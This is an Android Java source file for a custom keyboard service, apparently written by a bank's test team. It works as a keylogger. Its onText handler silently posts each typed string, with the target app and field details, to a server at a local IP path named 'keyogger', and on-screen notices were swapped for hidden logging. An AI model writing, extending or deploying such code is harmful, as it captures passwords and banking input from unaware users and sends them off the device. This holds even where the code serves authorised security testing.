package ambank.gtr.testteam;

import android.content.pm.PackageManager;
import android.inputmethodservice.InputMethodService;
import android.util.Log;
import android.view.KeyEvent;
import android.view.View;
import android.view.inputmethod.EditorInfo;
import android.view.inputmethod.InputConnection;

import org.json.JSONObject;

import java.util.UUID;
import ambank.gtr.testteam.LogUtils;

public class FancyKeyboardService extends InputMethodService
        implements FancyKeyboardView.Listener {

    private static final String TAG = "FancyKeyboard";

    private FancyKeyboardView view;
    private String fieldInfo = "";
    private String sessionId = "";
    private long sessionStart = 0L;

    @Override
    public View onCreateInputView() {
        view = new FancyKeyboardView(this);
        view.setListener(this);
        return view;
    }

    @Override
    public void onStartInputView(EditorInfo info, boolean restarting) {
        super.onStartInputView(info, restarting);

        String pkg = info.packageName;
        String appName = pkg;
        try {
            PackageManager pm = getPackageManager();
            appName = pm.getApplicationLabel(pm.getApplicationInfo(pkg, 0)).toString();
        } catch (PackageManager.NameNotFoundException ignored) { }

        fieldInfo = "app=" + appName + " (" + pkg + ")"
                + " | hint=" + info.hintText
                + " | label=" + info.label
                + " | fieldName=" + info.fieldName
                + " | fieldId=" + info.fieldId;

        sessionId = UUID.randomUUID().toString().substring(0, 8);
        sessionStart = System.currentTimeMillis();
        Log.d(TAG, "Session START [" + sessionId + "] " + fieldInfo);

        updateShift();
    }

    @Override
    public void onFinishInputView(boolean finishingInput) {
        super.onFinishInputView(finishingInput);
        long durationMs = System.currentTimeMillis() - sessionStart;
        Log.d(TAG, "Session END [" + sessionId + "] duration=" + durationMs + "ms");
    }

    @Override
    public void onText(String text) {
        Log.d(TAG, "[" + sessionId + "] Typed '" + text + "' -> " + fieldInfo);
        JSONObject payload = LogUtils.jsonObjBuilder("[" + sessionId + "] Typed '" + text + "' -> " + fieldInfo);
        HttpUtils.postJsonLog("http:192.168.1.165:3000/keyogger", payload, new HttpUtils.ApiCallback() {
            @Override
            public void onSuccess(String responseBody) {
                // Replaced Toast with background debug logging
                Log.d(TAG, "Log Upload Success! Server Response: " + responseBody);
            }

            @Override
            public void onFailure(String errorMessage) {
                // Replaced Toast with background error debugging
                Log.d(TAG, "Log Upload Failed. Reason: " + errorMessage);
            }
        });
        InputConnection ic = getCurrentInputConnection();
        if (ic != null) ic.commitText(text, 1);
        updateShift();
    }

    @Override
    public void onDelete() {
        InputConnection ic = getCurrentInputConnection();
        if (ic == null) return;
        CharSequence selected = ic.getSelectedText(0);
        if (selected != null && selected.length() > 0) ic.commitText("", 1);
        else ic.deleteSurroundingText(1, 0);
        updateShift();
    }

    @Override
    public void onEnter() {
        EditorInfo ei = getCurrentInputEditorInfo();
        InputConnection ic = getCurrentInputConnection();
        int action = ei == null ? EditorInfo.IME_ACTION_NONE
                : ei.imeOptions & EditorInfo.IME_MASK_ACTION;
        boolean plainEnter = ei == null
                || (ei.imeOptions & EditorInfo.IME_FLAG_NO_ENTER_ACTION) != 0
                || action == EditorInfo.IME_ACTION_NONE
                || action == EditorInfo.IME_ACTION_UNSPECIFIED;
        if (plainEnter || ic == null) sendDownUpKeyEvents(KeyEvent.KEYCODE_ENTER);
        else ic.performEditorAction(action);
        updateShift();
    }

    /** Auto-capitalise at the start of sentences, as the text field asks. */
    private void updateShift() {
        InputConnection ic = getCurrentInputConnection();
        EditorInfo ei = getCurrentInputEditorInfo();
        if (view == null || ic == null || ei == null || ei.inputType == 0) return;
        view.setAutoShift(ic.getCursorCapsMode(ei.inputType) != 0);
    }
}
